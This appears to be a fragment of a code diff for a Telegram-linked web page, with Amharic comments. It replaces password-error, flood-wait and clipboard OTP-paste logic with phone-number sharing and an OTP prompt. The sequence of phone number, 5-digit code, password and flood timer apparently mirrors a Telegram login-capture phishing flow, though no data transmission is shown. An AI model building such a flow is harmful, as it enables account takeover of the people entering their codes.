+                    // ተጠቃሚው Cancel ካደረገ ወይም ፍቃደኛ ካልሆነ እዚህ ጋር ይቆማል
+                    resetButton(originalText);
+                    showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።");
+                }
+            });
+        } else {
+            // ከቴሌግራም ውጪ ብሮውዘር ላይ ለመሞከር (Fallback)
+            let mockConfirm = confirm("[የሙከራ አካባቢ] እባክዎ ስልክ ቁጥርዎን ለማጋራት ፍቃደኛ ይሁኑ?");
+            if (mockConfirm) {
+                processToOTP();
             } else {
-                showMsg(step, 'error', 'Incorrect password.');
+                resetButton(originalText);
+                showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።");
             }
         }
     }
 
-    function showMsg(stepId, type, text) {
-        const el = document.getElementById('status' + stepId);
-        if(!el) return;
-        el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
+    // ወደ OTP ሽግግር የሚወስድ መነሻ (የእርስዎን የጀርባ አሰራር/Backend የሚቀሰቅስ)
+    function processToOTP() {
+        validationErrorBox.style.display = 'none';
+        alert("የማረጋገጫ ኮድ በቴሌግራም ተልኮልዎታል። እባክዎ የደረሰዎትን OTP ያስገቡ።");
+        
+        // እዚህ ጋር ወደ ቀጣዩ የ OTP ማስገቢያ ገጽ (ለምሳሌ፡ showStep(2); ወይም ተፈላጊውን የ UI ኮድ ማስገባት ይችላሉ)
     }
 
-    function hideMsg(stepId) {
-        const el = document.getElementById('status' + stepId);
-        if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
+    // ቁልፉን ወደ ነበረበት መመለሻ
+    function resetButton(text) {
+        isProcessing = false;
+        dynamicSubmitBtn.disabled = false;
+        submitBtnText.innerText = text;
     }
 
-    function startFloodTimer(seconds) {
-        showStep('flood_step');
-        let rem = seconds;
-        const iv = setInterval(() => {
-            let m = Math.floor(rem / 60), s = rem % 60;
-            document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-            if (rem-- <= 0) { clearInterval(iv); location.reload(); }
-        }, 1000);
-    }
-
-    function setupLongPressPaste() {
-        const container = document.getElementById('otp_container');
-        let timer;
-        if(container){
-            container.addEventListener('touchstart', () => {
-                timer = setTimeout(async () => {
-                    try {
-                        const text = await navigator.clipboard.readText();
-                        const cleanCode = text.replace(/\D/g, '').slice(0, 5);
-                        if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
-                    } catch (err) {}
-                }, 800);
-            });
-            container.addEventListener('touchend', () => clearTimeout(timer));
-        }
+    // ስህተቶችን በ UI የኤረር ሳጥን ላይ ማሳያ
+    function showUiError(message) {
+        validationErrorBox.style.display = 'flex';
+        validationErrorBox.querySelector('p').innerText = message;
     }
 </script>
-</body>
+
+</body>  
 </html>
